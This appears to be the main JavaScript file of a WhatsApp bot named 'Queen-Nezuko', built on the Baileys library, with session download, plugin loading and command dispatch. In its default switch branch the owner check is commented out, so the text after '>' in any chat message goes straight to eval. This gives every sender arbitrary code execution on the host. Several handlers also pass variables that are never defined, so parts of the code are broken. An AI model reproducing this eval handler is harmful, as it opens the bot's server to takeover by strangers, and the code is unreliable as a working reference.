
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  getContentType,
  Browsers,
  getAggregateVotesInPollMessage,
   makeInMemoryStore,
  makeCacheableSignalKeyStore,
  receivedPendingNotifications,
  } = require('@whiskeysockets/baileys')
const fs = require('fs')
const P = require('pino')
const path = require('path');
const config = require('./config')
const X = require("./config.js")
const qrcode = require('qrcode-terminal')
const util = require('util')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson} = require('./lib/functions')
const { sms,downloadMediaMessage } = require('./lib/msg')
const axios = require('axios');
const cheerio = require('cheerio');

const { File } = require('megajs')
const prefix = config.PREFIX;
const ownerNumber = config.OWNER;
const l = console.log
const addresses = config.ADDRESSES;
const addressArray = addresses.split(',');
function genMsgId() {
  const lt = 'queen-nezuko~';
  const prefix = "3EB";
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let randomText = prefix;

  for (let i = prefix.length; i < 22; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    randomText += characters.charAt(randomIndex);
  }

  return randomText;
}
  //=========================================
let previousLinkId = '1';
//===================SESSION============================
if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
    if (X.SESSION_ID) {
      const sessdata = X.SESSION_ID.replace("NEZUKO=", "")
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
      filer.download((err, data) => {
        if (err) throw err
        fs.writeFile(__dirname + '/auth_info_baileys/creds.json', data, () => {
          console.log("Session download completed !!")
        })
      })
    }
  }
// <<==========PORTS===========>>
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;
//====================================
async function connectToWA() {
  console.log("Connecting bot...");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
    const latestWebVersion = () => {
          let version
          try {
              let a = fetchJson('https://web.whatsapp.com/check-update?version=1&platform=web')
              version = [a.currentVersion.replace(/[.]/g, ', ')]
          } catch {
              version = [2, 2204, 13]
          }
          return version
   }
  const store = makeInMemoryStore({
          logger: P({ level: "silent", stream: "store" }),
      });
  const NodeCache = require("node-cache")
  const msgRetryCounterCache = new NodeCache()
  
      const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: false,     
       auth: {
           creds: state.creds,
           keys: makeCacheableSignalKeyStore(state.keys, P({ level: "fatal" }).child({ level: "fatal" })),
        },
        browser: Browsers.macOS("Safari"),
        getMessage: async (key) => {
           let jid = jidNormalizedUser(key.remoteJid)
           let msg = await store.loadMessage(jid, key.id)
  
           return msg?.message || ""
        },
        msgRetryCounterCache,
        defaultQueryTimeoutMs: undefined, 
        syncFullHistory: false,
        latestWebVersion,
     })
  
          store.bind(conn.ev)
  setInterval(() => {
      store.writeToFile(__dirname+"/store.json");
    }, 3000);
  
conn.ev.on('connection.update', (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
connectToWA()
}
} else if (connection === 'open') {

console.log('Installing plugins 🔌... ')
const path = require('path');
fs.readdirSync("./plugins/").forEach((plugin) => {
if (path.extname(plugin).toLowerCase() == ".js") {
require("./plugins/" + plugin);
}
});
console.log('Plugins Loaded✅')
console.log('Nezuko Is Alive☔')
conn.sendMessage(ownerNumber + "@s.whatsapp.net", { text: `𝐍𝐄𝐙𝐔𝐊𝐎 𝐈𝐒 𝐀𝐋𝐈𝐕𝐄🎗️` } ,{messageId:genMsgId()} )    
sleep(5000)

 
}
})
conn.ev.on('creds.update', saveCreds)

conn.ev.on('messages.upsert', async(mek) => {
try {
mek = mek.messages[0]
if (!mek.message) return	
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
const m = sms(conn, mek)
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'No Name'
const isMe = botNumber?.includes(senderNumber)	
const isOwner = ownerNumber?.includes(senderNumber) 
const botNumber2 = await jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = isGroup ? groupAdmins?.includes(botNumber2) : false
const isAdmins = isGroup ? groupAdmins?.includes(sender) : false
const isreaction = m.message.reactionMessage ? true : false
const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: mek ,messageId:genMsgId()  })
}
conn.sendFileUrl = async(jid, url, caption, quoted, options = {}) => {
  let mime = '';
  let res = await axios.head(url)
  mime = res.headers['content-type']
  if (mime.split("/")[1] === "gif") {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted,   ...options })
  }
  let type = mime.split("/")[0] + "Message"
  if (mime === "application/pdf") {
      return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted,  ...options })
  }
  if (mime.split("/")[0] === "image") {
      return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted ,  ...options })
  }
  if (mime.split("/")[0] === "video") {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted ,  ...options })
  }
  if (mime.split("/")[0] === "audio") {
      return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted,  ...options })
  }
}


//if (!isMe && !isZen && !isZenitsugod && !isZenitsulord && !isGodzenitsu && !isZenitsux && !isZenitsu && !isOwner && !isGroup && config.ONLY_GROUP == 'true') return 
//if (!isMe && !isZen && !isZenitsugod && !isZenitsulord && !isGodzenitsu && !isZenitsux && !isZenitsu && !isOwner && config.ONLY_ME == 'true') return 
//==================================plugin map================================
const events = require('./command')
const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
if (isCmd) {
const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias?.includes(cmdName))
if (cmd) {
if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})

try {
cmd.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isZenitsugod, isZen, isGodzenitsu, isZenitsu, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
} catch (e) {
console.error("[PLUGIN ERROR] ", e);
}
}
}
events.commands.map(async(command) => {
if (body && command.on === "body") {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isGodzenitsu, isZenitsugod, isZen, isZenitsu, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (mek.q && command.on === "text") {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isZenitsugod, isZen, isGodzenitsu, isZenitsu, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (
(command.on === "image" || command.on === "photo") &&
mek.type === "imageMessage"
) {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isZenitsugod, isZenitsu, isZen, isGodzenitsu, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (
command.on === "sticker" &&
mek.type === "stickerMessage"
) {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isZenitsugod, isZen, isZenitsu, isGodzenitsu, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
}});


if (config.AUTO_VOICE === 'true') {			       
const url = 'https://gist.github.com/prabathLK/f602911954a959c8730aeb00a588d15d/raw'
let { data } = await axios.get(url)
for (vr in data){
if((new RegExp(`\\b${vr}\\b`,'gi')).test(body)) conn.sendMessage(from,{audio: { url : data[vr]},mimetype: 'audio/mpeg',ptt:true},{quoted:mek})   
}}
	
//====================================================================
switch (command) {
case 'jid':
reply(from)
break

default:				
// if ((isOwner || isZenitsugod || isZenitsu || isZen || isGodzenitsu || isZenitsulord || isMe) && body.startsWith('>')) {
let bodyy = body.split('>')[1]
let code2 = bodyy.replace("°", ".toString()");
try {
let resultTest = await eval(code2);
if (typeof resultTest === "object") {
reply(util.format(resultTest));
} else {
reply(util.format(resultTest));
}
} catch (err) {
reply(util.format(err));
}}}
} catch (e) {
const isError = String(e)
console.log(isError)}
})
}
app.get("/", (req, res) => {
res.send("📟 Queen-Nezuko Working successfully!");
});
app.listen(port, () => console.log(`Queen-Nezuko Server listening on port http://localhost:${port}`));
setTimeout(() => {
connectToWA()
}, 3000);
